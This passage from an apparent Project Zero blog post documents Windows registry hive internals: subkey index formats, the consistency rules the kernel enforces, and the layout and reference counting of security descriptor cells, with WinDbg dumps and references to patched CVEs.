MaxValueDataLen      : 0x0

LastWriteTime        : 0x 1db2b94:0xe031a530

0: kd> !reg keyinfo 0xffff800f88a8e000 ffff800f896e8024

KeyPath         \REGISTRY\MACHINE\SYSTEM

[SubKeyAddr]         [SubKeyName]

ffff800f896e8174     ActivationBroker

ffff800f896e964c     ControlSet001

ffff800f89f0e8a4     DriverDatabase

ffff800f89f999c4     HardwareConfig

ffff800f89f9a314     Input

ffff800f89f9a3dc     Keyboard Layout

ffff800f89f9a43c     Maps

ffff800f89f9a674     MountedDevices

ffff800f89f9ab64     ResourceManager

ffff800f89f9abc4     ResourcePolicyStore

ffff800f89f9ac2c     RNG

ffff800f89f9addc     Select

ffff800f89f9aed4     Setup

ffff800f89f9b7d4     Software

ffff800f89f9d1f4     State

ffff800f89f9d24c     WaaS

ffff800f89fabc8c     WPA

[SubKeyAddr]         [VolatileSubKeyName]

ffff800f88b91024     CurrentControlSet

 Use '!reg keyinfo ffff800f88a8e000 <SubKeyAddr>' to dump the subkey details

[ValueType]         [ValueName]                   [ValueData]

 Key has no Values

We have indeed ended up at the root key of the SYSTEM hive, which has a standard key node signature ('nk'), the predefined "ROOT" name, a valid security descriptor, a list of subkeys, and so on.

Overall, link nodes are an interesting implementation detail of the registry that are worth keeping in mind. However, considering their relative simplicity and the fact that they are hidden away even from very low-level mechanisms like [Registry Callbacks](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-cmregistercallbackex), they are of limited significance to system security. The lone vulnerability I found related to them, [CVE-2023-21747](https://project-zero.issues.chromium.org/issues/42451505), resulted in a use-after-free due to improper cleanup of the exit node when faced with an out-of-memory condition.

#### Subkey indexes

Operations performed on subkey lists are some of the most common ones – they are involved whenever a key is opened, created, deleted, renamed or enumerated, which constitutes a majority of actions involving the registry at runtime. It is for this reason that subkey lists have seen the most evolution throughout the subsequent versions of the regf format. As the interface was getting adopted by more and more applications in Windows NT and later systems, Microsoft developers could collect data on the typical usage patterns and devise adequate optimizations to speed these operations up. In this section, we will have a deeper look into how subkey indexes are formatted in the hives, and how the different types of operations affect them.

By way of introduction, subkey indexes are data structures storing lists of descendant keys relative to a parent key, referenced through the \_CM\_KEY\_NODE.SubKeyLists[...] cell indexes. During hive load, the value at index 0 of the array may either be a subkey index, or HCELL\_NIL if there are no subkeys; index 1 must always be equal to HCELL\_NIL, as by definition there are no volatile subkeys on disk. The high-level concept behind the subkey index is that it is a linear list of key node cell indexes, which must efficiently support the following operations (from most to least commonly used, in my subjective opinion):

1. Finding a key by name,
2. Finding a key by index on the list,
3. Adding a new key to the list,
4. Deleting a key from the list.

Regardless of the underlying representation of the list, it is always stored in a lexicographical order, reducing the lookup-by-name time from linear to logarithmic by using binary search. Let's now look into the specific structures used in registry hives to implement this functionality.

##### Index leaves

Index leaves are the most basic type of a subkey list, which has been supported since the first iteration of the regf format and consists of just three members: the signature (0x696C, 'li'), number of entries (16-bit), and an inline, variable-length list of the cell indexes. The corresponding Windows kernel structure is \_CM\_KEY\_INDEX:

0: kd> dt \_CM\_KEY\_INDEX

nt!\_CM\_KEY\_INDEX

   +0x000 Signature        : Uint2B

   +0x002 Count            : Uint2B

   +0x004 List             : [1] Uint4B

Given the Count field range, the index leaf can store up to 65535 subkeys. It is the most compact one in terms of disk/memory consumption, but it provides somewhat poor cache locality, because every key referenced during the lookup must be accessed in memory in order to read its name from \_CM\_KEY\_NODE.Name. Nevertheless, index leaves are still commonly used in all versions of Windows up to this day.

As an example, let's consider a key with five subkeys named "wombat", "🐂", "HIPPO", "ant", and "ocelot". An index leaf of such a key could look like this:

[![Diagram showing a key with five subkeys, as described in the sentence preceding this image](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjP6HTqFmlJWUcQw8x4ApSJkCj3ffelx8GBKKVMlXnQhKdWAsGBAKD8vKpHjiA3JS0GvOv9aqOc4r78CUbOKhyphenhyphenJ0ToMevio52XIou94wWK6jahtxS8IShyphenhyphenX63QzpBOXDFIA1m9yDRY1vkglHGXqT4TiiPjX5korMRt6-mg_27y7OuOwNgnaCF0XHLjPcUY/s1200/image3.png "Diagram showing a key with five subkeys, as described in the sentence preceding this image")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjP6HTqFmlJWUcQw8x4ApSJkCj3ffelx8GBKKVMlXnQhKdWAsGBAKD8vKpHjiA3JS0GvOv9aqOc4r78CUbOKhyphenhyphenJ0ToMevio52XIou94wWK6jahtxS8IShyphenhyphenX63QzpBOXDFIA1m9yDRY1vkglHGXqT4TiiPjX5korMRt6-mg_27y7OuOwNgnaCF0XHLjPcUY/s1999/image3.png)

This illustrates that entries in the list are indeed stored in a sorted manner, and in a case-insensitive way – "ant" goes before "HIPPO" even though 'H' (0x48) < 'a' (0x61). However, this logic applies to comparisons only, and otherwise the letter casing specified during key creation is preserved and visible to registry users. Finally, the unicode ox symbol is placed last on the list, because it is encoded as U+D83D U+DC02, and 0xD83D is greater than any of the ASCII characters in the other names.

##### Fast leaves

Fast leaves are slightly younger than subkey indexes, introduced in regf version 1.3 in 1995 (Windows NT 4.0). As hive versions 1.2 and below have been long obsolete, that means that fast leaves are universally supported in every modern version of Windows at the time of this writing. As the name suggests, they are meant to be faster than their predecessors, by including up to four initial characters of each subkey in the list as a "hint" next to the cell index of the key. This allows the kernel to execute the first four iterations of the string comparison loop using data only from the fast leaf and without referring to the corresponding node, which addresses the aforementioned issue of poor cache locality in index leaves. We expect this optimization to be effective in most real-life scenarios, as most keys consist of ASCII-only characters and differ from each other within the first four symbols.

The specific logic of generating the 32-bit hint from a string can be found in the internal CmpGenerateFastLeafHintForUnicodeString kernel function, but is boils down to the following steps:

1. Set the initial hint variable to 0
2. In a loop of min(4, length) iterations:

1. If the n-th character is greater than 0xFF, break
2. Otherwise add the character (with its original case) to the hint

3. Return the hint to the caller

For example, the hint for "ant" is "ant\0", the hint for "HIPPO" is "HIPP", and the hint for "🐂" is "\0\0\0\0" (the first character is non-ASCII, so the whole hint is simply zero).

When it comes to the structure layout of the fast leaf, it is basically the same as the index leaf, but it has a different signature ('lf') and twice as many entries in the List array due to the addition of hints. There doesn't seem to be any structure definition corresponding specifically to fast leaves in the public symbols, which either means that the structure is a non-public one, or it is also accessed via \_CM\_KEY\_INDEX in the source code, but through references such as Index.List[2\*n] instead of Index.List[n]. An illustration of a fast leaf containing the five example subkeys is shown below:

[![Fast Leaf diagram containing the five example subkeys](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjR21S8gOfvMWCmn3wA9caP05aHsplcoyJ0OcsyK6ZibKgAIn8wciEdZ_Me4VkWBt2a_RiDkHk9LVKzTMSnN_3UTOSsHiwcs7AkXuCMXGQqkHZs1wlDTe-b2dAEWh_EQBjm2Zf8oT85pwnnyGIFmnSu8N-LOP47in47a6LYxx2zU0s6lx8dowpA0d1uIl8/s1200/image4.png "Fast Leaf diagram containing the five example subkeys")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjR21S8gOfvMWCmn3wA9caP05aHsplcoyJ0OcsyK6ZibKgAIn8wciEdZ_Me4VkWBt2a_RiDkHk9LVKzTMSnN_3UTOSsHiwcs7AkXuCMXGQqkHZs1wlDTe-b2dAEWh_EQBjm2Zf8oT85pwnnyGIFmnSu8N-LOP47in47a6LYxx2zU0s6lx8dowpA0d1uIl8/s1999/image4.png)

##### Hash leaves

Hash leaves are the third and last (for now) iteration of the subkey index format, introduced in Windows XP in 2001 (regf version 1.5). They have exactly the same data layout as fast leaves, but are characterized by the 'lh' signature, and the 32-bit hint is a simple hash of the entire string instead of an inline representation of the first four characters. The specific hashing algorithm is implemented in the internal CmpHashUnicodeComponent function, and can be summarized with the following steps:

1. Start with a hash equal to 0
2. For every character in the string:

1. Hash = (Uppercase(Character) + 37 \* Hash) % 0x100000000

3. Return the hash to the caller

The main benefit of this approach is that it works equally well with ASCII and non-ASCII strings, and it covers the entire name and not just a prefix, further limiting the number of necessary references to the subkey nodes during key lookup. However, you may notice that a full-string hash isn't really compatible with the concept of binary search, and indeed, whenever a hash leaf is used, the kernel performs a linear search instead of a binary one, as can be seen in the corresponding CmpFindSubKeyByHashWithStatus function. In theory, this could lead to iterating through 65535 keys (the maximum number of entries in a hash leaf), but in practice, the kernel makes sure that a hash leaf is never longer than 1012 elements. This is okay for performance, because when more subkeys are associated with a key, a second-level data structure comes into play (the root index, see the next section), and that one is always traversed with a binary search. Overall, it seems possible that the cache friendliness of the hash leaf makes up for its theoretically worse lookup complexity, especially in the average case.

A corresponding diagram of a hash leaf data layout is shown below:

[![Image showing hash leaf data layout as described above](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjSJ-jlTLvArbHK0iIrfnYUFm0rFVw3APRQuN8TYOVhUPhUEFNPHbOik1OgSb5VjWWwM79gJf4CUHQKZCrz8nPdMjFUgTNs2N1kT3xFcIeBLo9dd0UHSMTd1WDiS0Qk5OAeDK_GANlMrx4yeTMVP7JaJmY1OQtHI3_SXMEdCfNw0JLbBaA12eeamo6_4HM/s1200/image15.png "Image showing hash leaf data layout as described above")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjSJ-jlTLvArbHK0iIrfnYUFm0rFVw3APRQuN8TYOVhUPhUEFNPHbOik1OgSb5VjWWwM79gJf4CUHQKZCrz8nPdMjFUgTNs2N1kT3xFcIeBLo9dd0UHSMTd1WDiS0Qk5OAeDK_GANlMrx4yeTMVP7JaJmY1OQtHI3_SXMEdCfNw0JLbBaA12eeamo6_4HM/s1999/image15.png)

##### Root indexes

Each key in the registry can potentially have many thousands of subkeys, but having them stored in one very long list (such as a single index, fast or hash leaf) could lead to poor performance for some operations. For example, whenever a new key is inserted into the alphabetically sorted list, the portion of the list after the new key has to be moved in memory to make room for the new item. Similar CPU-heavy situations could arise when extending the dynamically sized array in the hive, and potentially having to copy its entire contents to a new cell if the existing one doesn't have any free space behind it. In the worst case scenario, this would have a complexity of O(n) per operation, which is too slow for such an important system mechanism as the Windows registry.

It is likely for this reason that whenever the subkey list becomes longer than 1012 elements for the first time, a second-level index called the root index is inserted into the data structure. This has the goal of splitting a single long list into several shorter ones, which are easier to manage in memory. Root indexes cannot be nested or referenced recursively by one another: a subkey list may either be non-existent, a single leaf-type list, or a single root index pointing at leaf-type lists (in other words, the list may be 0, 1 or 2 levels deep).

The root index has existed for as long as the index leaves have: since the very first regf version 1.0 in Windows NT 3.1 Pre-Release. It also has the same layout represented by the \_CM\_KEY\_INDEX structure, which consists of a signature ('ri' in this case), a 16-bit count and an array of cell indexes pointing at leaf-type lists, without any additional hints. An example diagram of a two-level subkey index containing five keys is shown below:

[![An image showing an example diagram of a two-level subkey index containing five keys](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjWjDioDrxKadIbSrn48slGPbLJVi4YcOls62a4ruBHalts-KBFnJOO4NyUEqdtze-EyWCtBdrJSMrbaPNx0E3O1s2d3hWqbYV_6pwjmIW-rctVdnfn6dbIdEo7hyPjPr2yePJOtA6xOA2D_v_BPVVEnH-M2AMaKhrMtrTZBF4UWywvboQURcrYKNXWfAQ/s1200/image13.png "An image showing an example diagram of a two-level subkey index containing five keys")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjWjDioDrxKadIbSrn48slGPbLJVi4YcOls62a4ruBHalts-KBFnJOO4NyUEqdtze-EyWCtBdrJSMrbaPNx0E3O1s2d3hWqbYV_6pwjmIW-rctVdnfn6dbIdEo7hyPjPr2yePJOtA6xOA2D_v_BPVVEnH-M2AMaKhrMtrTZBF4UWywvboQURcrYKNXWfAQ/s1999/image13.png)

##### Fundamental subkey list consistency requirements

There is a set of some very basic format consistency requirements concerning subkey indexes, which must be always met for any active hive in the system, regardless of whether it has been loaded from disk or created from scratch at runtime. These are the minimum set of rules for this data structure to be considered as "valid", and they are tightly connected to the memory safety guarantees of the kernel functions that operate on them. They are as follows:

* The signature of each subkey list cell must be correctly set to its corresponding type, one of 'li', 'lf', 'lh' or 'ri'.
* The size of the cell must be greater or equal to the number of bytes required to store all of the elements in the "List" array, according to the value of the "Count" member.
* A subkey list cell may never be empty, i.e. \_CM\_KEY\_INDEX.Count mustn't be zero (whenever it becomes zero, it should be freed and un-referenced in any of the other hive cells).
* The number of subkeys cached in the key node (\_CM\_KEY\_NODE.SubKeyCounts[x]) must be equal to the number of subkeys defined in the subkey index (i.e. the sum of \_CM\_KEY\_INDEX.Count of its index leaves).
* The cell indexes stored in \_CM\_KEY\_NODE.SubKeyLists[x] must either be HCELL\_NIL (if SubKeyCounts[x] is zero), or point to a root index or one of the three leaf types. Additionally, SubKeyCounts[1] must be zero and SubKeyLists[1] must be HCELL\_NIL on hive load.
* All cell indexes stored in a root index must point at valid leaf indexes.
* All cell indexes stored in leaf indexes must point at valid key nodes.
* All hints specified in the fast leaves and hash leaves must be consistent with the names of their corresponding keys.
* The overall subkey list must be sorted lexicographically, i.e. the name of each n+1th subkey must be strictly greater than the name of the nth subkey. This also entails that there mustn't be any duplicates in the subkey list, neither with regards to the cell index or the subkey name.

Notably, there are also some constraints that seem very natural, but are in fact not enforced by the Windows kernel:

* There is no requirement that the format of a leaf-type index must be consistent with the version of the hive: instead, every one of li/lf/lh types are accepted for every hive version 1.3 – 1.6. The most glaring example of this behavior is that hash leaves are allowed in hive versions 1.3 and 1.4, even though they were historically only introduced in version 1.5 of the format.
* There is no requirement that all the leaf indexes referenced by a root index are all of the same type. In fact, a single subkey list may consist of an arbitrary combination of index leaves, fast leaves and hash leaves, and the kernel must handle such situations gracefully.
* Beyond the fact that none of the actively used subkey indexes may be empty, there are no limitations with regards to how the subkeys are laid out in the data structure. For example, the existence of a root index doesn't automatically indicate that there are many subkeys on the list: there may as well be a single root index, pointing to a single leaf, containing a single subkey. It is also allowed for several leafs being part of a single root index to have wildly different counts, with some single-digit ones coexisting with others around the 64K mark. The kernel doesn't ensure any advanced "balancing" of the subkey index by default – it does split large leafs into smaller ones, but only while adding a new subkey, and not during the loading of an existing hive.

Three examples of kernel vulnerabilities that were directly related to the handling of subkey lists are: [CVE-2022-37956](https://project-zero.issues.chromium.org/issues/42451449) (integer overflows in registry subkey lists leading to memory corruption), [CVE-2022-38037](https://project-zero.issues.chromium.org/issues/42451465) (memory corruption due to type confusion of subkey index leaves in registry hives) and [CVE-2024-26182](https://project-zero.issues.chromium.org/issues/42451661) (subkey list use-after-free due to mishandling of partial success in CmpAddSubKeyEx). I personally find the first one (CVE-2022-37956) particularly interesting, because the hive memory corruption could be triggered with the right sequence of API calls, or even just command-line reg.exe tool invocations. Granted that the number of required operations was quite high (around 66 million), but it still goes to show that being intimately familiar with the inner workings of the target software may open new avenues of exploitation that would otherwise not be available. For a detailed explanation of the subkey list management logic, see the next section.

##### Internal Windows logic of handling subkey lists

On top of the requirements and restrictions imposed by the regf format itself, there are some further characteristics of most registry hives found on real systems, caused by some decisions implemented in the logic of the Windows kernel. The most important thing to note is that, as mentioned above, the kernel operates on any subkey list lazily, only when there is a need to do so due to a key being added/deleted in the registry. Therefore, a weirdly formatted (but adhering to the bare regf requirements) subkey index will remain in this state after loading, for as long as a client application doesn't decide to change it.

Most of the relevant high-level logic of handling subkey lists takes place when adding new keys, and is illustrated in the flow chart below:

[![Complex flow chart describing the high-level logic handling of the subkey lists when ading new keys](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgK4FzEO7DB1fgLZ96e54QiXFtGiXuQIuXZDq6WCo-MSWWPBmYF70XVTr4iDGRx9YVhQhpEvcVC5fbBzWjjMPTMl9HFYaBvO5bVgLvps6cFhOSi-6GjyAh21FZkfMTWHOrPBS813mxVaguSBeOVejinIUwG_zyqzo89apHwtN8d8QMso2zluEw0kfA6gq4/s1200/image12.png "Complex flow chart describing the high-level logic handling of the subkey lists when ading new keys")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgK4FzEO7DB1fgLZ96e54QiXFtGiXuQIuXZDq6WCo-MSWWPBmYF70XVTr4iDGRx9YVhQhpEvcVC5fbBzWjjMPTMl9HFYaBvO5bVgLvps6cFhOSi-6GjyAh21FZkfMTWHOrPBS813mxVaguSBeOVejinIUwG_zyqzo89apHwtN8d8QMso2zluEw0kfA6gq4/s1999/image12.png)

The general high-level function that implements the above logic in the Windows kernel is CmpAddSubKeyEx, which then calls a few helper routines with mostly self-descriptive names: CmpAddSubKeyToList, CmpSelectLeaf, CmpSplitLeaf and CmpAddToLeaf. Compared to addition, the process of deleting a key from the list is very straightforward, and is achieved by removing it from the respective leaf index, freeing the leaf if it was the last remaining element, and freeing the root index if it was present and the freed leaf was its last remaining element. There are no special steps being taken other than the strictly necessary ones to implement the functionality.

Given the above, we can conclude that registry hives created organically by Windows generally adhere to the following set of extra rules:

* The leaf types being used are in line with the version of the hive: index and fast leaves for versions ≤1.4, and hash leaves for versions ≥1.5.
* All leaves within a single index root have the same type.
* Index leaves never contain more than 1012 elements.
* Once a root index is created for a key, it is never downgraded back to a single leaf index other than through the deletion of all subkeys, and creating a new one starting from an empty subkey list.

#### Security descriptors

Security descriptors play a central role in enforcing access control to the information stored in the registry. Their significance is apparent through the fact that they are the only mandatory property of registry keys, as opposed to classes, values and subkeys which are all optional. At the same time, large groups of keys typically share the same security settings, so it would make little sense to store a separate copy of the data for every one of them. For example, in a default installation of Windows 11, the SOFTWARE hive includes around 250,000 keys but only around 500 unique security descriptors. This is why they are the only type of cell in the hive that can be associated with multiple keys at the same time. By only storing a single instance of each unique descriptor in the hive, the system saves significant disk and memory space. However, this efficiency requires careful management of each descriptor's usage through reference counting, which ensures they can be safely freed when no longer needed.

When loading a hive, the kernel enumerates all of its security descriptors without having to traverse the entire key tree first. In order to make this possible, security descriptors in the stable space are organized into a doubly-linked list, starting at the descriptor of the root key. Internal consistency of this list is mandatory – if any inconsistencies are found, it is reset to become a single-entry list with just the root security descriptor and nothing else. If the root security descriptor itself is corrupted, the hive is deemed to be in an unrecoverable state and rejected completely.

While traversing the global list, the kernel also verifies that the binary encoding of the security descriptors is valid and safe to pass to internal security-related functions later in time. In the hives, descriptors are formatted as self-contained blobs of bytes adhering to the SECURITY\_DESCRIPTOR\_RELATIVE structure layout. Compared to other hive cells (key nodes etc.), the internal format of security cells is relatively complex: it is variable in size and contains multiple sub-structures (SIDs, ACLs, ACEs), length indicators and internal offsets. To detect any potential corruption early, the [RtlValidRelativeSecurityDescriptor](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlvalidrelativesecuritydescriptor) function must succeed for every descriptor in a newly loaded hive, otherwise the previously discussed fallback logic takes place.

The last step in the security descriptor validation process is to make sure that the reference counts specified in the hive are equal to the actual number of references from registry keys. This is achieved by re-counting the references when traversing the key tree structure of the hive, and later checking if the values found in \_CM\_KEY\_SECURITY.ReferenceCount are in line with the regenerated counts. If the two values are unequal, the refcount in the security cell is adjusted to reflect the correct number of references. This is critical for system security, because operating on an invalid refcount – especially an inadequately small one – may directly lead to exploitable memory corruption conditions.

Some examples of historical vulnerabilities related to the three fundamental aspects of security descriptor consistency are as follows:

* Linked list consistency: [CVE-2022-34708](https://project-zero.issues.chromium.org/issues/42451425), [CVE-2024-26178](https://github.com/googleprojectzero/p0tools/tree/master/WinRegLowSeverityBugs/Reports/13_CmpLightWeightPrepareSetSecDescUoW_security_list_confusion)
* Security descriptor binary format validity: [CVE-2022-35768](https://project-zero.issues.chromium.org/issues/42451427)
* Reference counting: [CVE-2022-34707](https://project-zero.issues.chromium.org/issues/42451423), [CVE-2023-28248](https://project-zero.issues.chromium.org/issues/42451552), [CVE-2023-35356](https://project-zero.issues.chromium.org/issues/42451596), [CVE-2023-35382](https://project-zero.issues.chromium.org/issues/42451592), [CVE-2023-38139](https://project-zero.issues.chromium.org/issues/42451601)

A high-level illustration of a security descriptor linked list consisting of three elements is shown in the diagram below:

[![A high-level illustration of a security descriptor linked list consisting of three elements](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjqTXWpBsQlSXs9DvSD8-xRXOpsZxH_n6U8a_qWbDBZE1mshkUwtD5b0x9OvxGTBtOR3mP6b6Xl0qRqRFtQ_3YFMC2ma6agYAicSzefN-iMcJOUS0keIdBbyYrGZoy144hS0vBLjBY3AJIfnZ-P6EP5fk2uMHKfRXzj7cnb4-dQCpiQcjb1hbVxWPG7W7U/s1200/image1.png "A high-level illustration of a security descriptor linked list consisting of three elements")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjqTXWpBsQlSXs9DvSD8-xRXOpsZxH_n6U8a_qWbDBZE1mshkUwtD5b0x9OvxGTBtOR3mP6b6Xl0qRqRFtQ_3YFMC2ma6agYAicSzefN-iMcJOUS0keIdBbyYrGZoy144hS0vBLjBY3AJIfnZ-P6EP5fk2uMHKfRXzj7cnb4-dQCpiQcjb1hbVxWPG7W7U/s1999/image1.png)

##### Security cell format

Let's now have a look at the specific layout of the security cells. They are represented by the \_CM\_KEY\_SECURITY structure, whose definition is shown in the WinDbg format below:

0: kd> dt \_CM\_KEY\_SECURITY

nt!\_CM\_KEY\_SECURITY

   +0x000 Signature        : Uint2B

   +0x002 Reserved         : Uint2B

   +0x004 Flink            : Uint4B

   +0x008 Blink            : Uint4B

   +0x00c ReferenceCount   : Uint4B

   +0x010 DescriptorLength : Uint4B

   +0x014 Descriptor       : \_SECURITY\_DESCRIPTOR\_RELATIVE

Each of its fields is discussed in more detail in the following subsections.

###### Signature

The magic bytes of this cell type, equal to 0x6B73 ('sk'). It exists for informational purposes only, but isn't used for anything at runtime – it isn't even verified on hive load, and can therefore be anything in a binary-controlled hive.

###### Reserved

An unused field that may contain arbitrary data; never accessed by the kernel.

###### Flink and Blink

As discussed earlier, these are the forward and backward links in the security descriptor list. They must always be kept in a valid state. In a single-element list, Flink/Blink point at themselves – that is, at the security descriptor they are both part of.

###### ReferenceCount

This single field was arguably responsible for the most registry-related vulnerabilities out of all of the hive structures. It is a 32-bit unsigned integer that expresses the number of objects that actively rely on this security descriptor, which mostly means the key nodes associated with it, but not only. Whenever this member gets out of sync with the real number of references, it may lead to serious memory corruption primitives, so it is very important that the kernel ensures its correct value both on hive load and during any subsequent operations. The two prevalent risks are that:

* The refcount gets too small: when this happens, it is possible that the cell gets freed while some objects still hold active references to it. This leads to a straightforward use-after-free scenario, and in my experience, it is easily exploitable by a local attacker.
* The refcount gets too large: this situation doesn't immediately lead to memory corruption, but let's remember that the structure member has a limited, 32-bit width. If an attacker were able to indiscriminately increment the counter without real references to back it up, they could eventually get it to the maximum uint32 value, 0xFFFFFFFF. For many years, the Windows kernel hasn't implemented any protection against registry refcount integer overflows, so another incrementation of the field after 0xFFFFFFFF would wrap it back to zero, which brings us to the previous scenario of an inadequately small count. However, following some bug reports and discussions, Microsoft has gradually added overflow protection in the relevant, internal functions, starting in April 2023 and eventually landing the last missing check in November 2024. Thanks to this effort, I believe that as I am writing this, security descriptor refcount leaks should no longer be an exploitable condition.

Under most circumstances, the value of the refcount is somewhere between 1 and ~24.4 million (the maximum number of keys in a hive given the space constraints). However, it is interesting to note that it might be legitimately set to a greater value. Consider the following: immediately after loading a hive, all security refcounts are exactly equal to the number of keys associated with them. But, key nodes globally visible in the registry tree are not the only ones that can reference security cells; there may be also keys that have been created in the scope of a transaction and not committed yet, as well as pending, transacted operations of changing the security properties of a key (marked by the UoWAddThisKey and UoWSetSecurityDescriptor enums of type UoWActionType). They too may increase the refcount value beyond what would normally be possible with just regular, non-transacted keys. This phenomenon has been discussed in detail in the [CVE-2024-43641](https://project-zero.issues.chromium.org/issues/42451732) bug report.

Overall, reference counts are of great importance to system security, and every registry operation that involves it deserves a thorough security assessment.

###### DescriptorLength

This is the length of the security descriptor data (i.e. the size of the Descriptor array) expressed in bytes. It's worth noting that the format doesn't force it to be the minimum length sufficient to store the binary blob. This means that the overall cell length must be greater than DescriptorLength + 20 (i.e. the declared length of the descriptor plus the \_CM\_KEY\_SECURITY header), and in turn DescriptorLength must be greater than the actual size of the descriptor. Both cases of the cell size or the DescriptorLength having non-optimal values are accepted by the kernel, and the extra bytes are ignored.

###### Descriptor

This variable-length array stores the actual security descriptor in the form of the SECURITY\_DESCRIPTOR\_RELATIVE structure. It doesn't necessarily have to be formatted in the most natural way, and the only requirement is that it successfully passes the [RtlValidRelativeSecurityDescriptor](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlvalidrelativesecuritydescriptor) check with the RequiredInformation argument set to zero. This means, for example, that the Owner/Group/Sacl/Dacl components may be spread out in memory and have gaps in between them, or conversely, that their representations may overlap. This was one of the main contributing factors in [CVE-2022-35768](https://project-zero.issues.chromium.org/issues/42451427), but the fix was to more accurately calculate the length of irregularly-encoded descriptors, and the freedom to structure them in non-standard ways has remained. It is even possible to use a completely empty descriptor without any owner or access control entries, and such a construct will be acknowledged by the system, too.

Another somewhat interesting fact is that security descriptors are meant to be deduplicated, so naturally whenever a user assigns a security descriptor that already exists in the hive, it is simply reused and its reference count is incremented. However, again, the format (or rather its canonical implementation in Windows) doesn't force the uniqueness requirement upon the security descriptors in hives loaded from disk. So, even though they would be never created by the OS itself, multiple identical copies of a descriptor are allowed in specially crafted hives and may co-exist without (seemingly) causing any issues for the kernel.

The access rights defined by the security descriptors are based on permissions specific to the registry and its operations, so there is an access mask dedicated to creating keys (KEY\_CREATE\_SUB\_KEY), reading values (KEY\_QUERY\_VALUE), writing values (KEY\_SET\_VALUE), and so on. They all have self-descriptive names and are well-documented in [Registry Key Security and Access Rights](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights), so we won't spend more time discussing them here.

##### Security descriptors of volatile keys

Similarly to every other property of a registry key, the storage type of a security descriptor always matches the type of its associated key(s). This means that a stable key will always use a stable descriptor, and a volatile key – a volatile descriptor. It is the only "exception" to the rule that security descriptors are deduplicated and unique within the scope of the hive. If there are two keys with identical security settings but different storage types, they will reference two distinct security descriptor cells via their \_CM\_KEY\_NODE.Security fields, one with the highest bit set and the other with the bit clear. The descriptors stored on both sides are subject to the same rules with regards to reference counting, allocating and freeing.

Furthermore, we have previously discussed how all security descriptors in a hive are connected in one global doubly-linked list, but this only applies to the descriptors in the stable space. The functionality is needed so that the descriptors can be enumerated by the kernel when loading a hive from disk, and since volatile descriptors are in-memory only and disappear together with their corresponding keys on hive unload or a system shutdown, there is no need to link them together. The internal CmpInsertSecurityCellList function takes this into account, and points the Flink/Blink fields at themselves, making each volatile descriptor a single-entry list in order to keep it compatible with the list linking/unlinking code. This behavior is illustrated in the diagram below, with two volatile security descriptors each being in their own pseudo-list:

[![Diagram described in the paragraph above, showing two security descripitors capybara and sloth](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjFvU_lKPXAXNcaDpkFMhxssobFSIMemew9rQ21RFY-nGjVmKns8vvv60C6dKpxixMtkHG6l_Macrlpck03gUskUCkfq4b-yEXDog6a3gQeP4KhT0vnfmk7SDLoFLVBthjzkH-RiZ7OY5O5YXuTACqGv32p8gbs8zo9cQKD-w2pG6DMmI3ornrG9z9xDLU/s1200/image9.png "Diagram described in the paragraph above, showing two security descripitors capybara and sloth")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjFvU_lKPXAXNcaDpkFMhxssobFSIMemew9rQ21RFY-nGjVmKns8vvv60C6dKpxixMtkHG6l_Macrlpck03gUskUCkfq4b-yEXDog6a3gQeP4KhT0vnfmk7SDLoFLVBthjzkH-RiZ7OY5O5YXuTACqGv32p8gbs8zo9cQKD-w2pG6DMmI3ornrG9z9xDLU/s1999/image9.png)

This slight quirk is the reason why the ability to create stable keys under volatile ones, which should normally not be possible, may be an exploitable condition with security impact. For details, see the "Creation of stable subkeys under volatile keys" section in the [CVE-2023-21748](https://project-zero.issues.chromium.org/issues/42451512) bug report, or the [CVE-2024-26173](https://github.com/googleprojectzero/p0tools/tree/master/WinRegLowSeverityBugs/Reports/04_Transacted_stable_under_volatile_keys) bug report.

##### Security descriptors in app hives

In normal registry hives, there are no artificial restrictions with regards to security descriptors. There may be an arbitrary number of them, and they may contain any type of settings the user wishes, as long as they have binary control over the hive file and/or the existing security descriptors grant them the access to change them to whatever they want. However, there are some limitations concerning security descriptors in application hives, as documented in the MSDN page of the [RegLoadAppKeyA](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regloadappkeya) function:

| All keys inside the hive must have the same security descriptor, otherwise the function will fail. This security descriptor must grant the caller the access specified by the samDesired parameter or the function will fail. You cannot use the RegSetKeySecurity function on any key inside the hive. |
| --- |

The intent behind the quote seems to be that the security settings within an app hive should be uniform and immutable; that is, remain identical to their initial state at hive creation, and consistent across all keys. There is indeed some truth to the documentation, as trying to change the security of a key within an app hive with [RegSetKeySecurity](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsetkeysecurity), or to create a new key with a custom descriptor both result in a failure with STATUS\_ACCESS\_DENIED. However, the part about all keys having the same security descriptor is not actually enforced, and a user can freely load an app hive with any number of different security descriptors associated with the keys. This was reported to Microsoft as [WinRegLowSeverityBugs issue #20](https://github.com/googleprojectzero/p0tools/tree/master/WinRegLowSeverityBugs/Reports/20_App_hive_security_inconsistencies), but wasn't deemed severe enough to be addressed in a security bulletin (which I agree with), so for now, it remains an interesting discrepancy between the documentation and implementation.

#### Key values and value lists

While keys allow software to create a data organization hierarchy, values are the means of actually storing the data. Each value is associated with one specific key, and is characterized by the following properties:

* Name
* Type
* Data

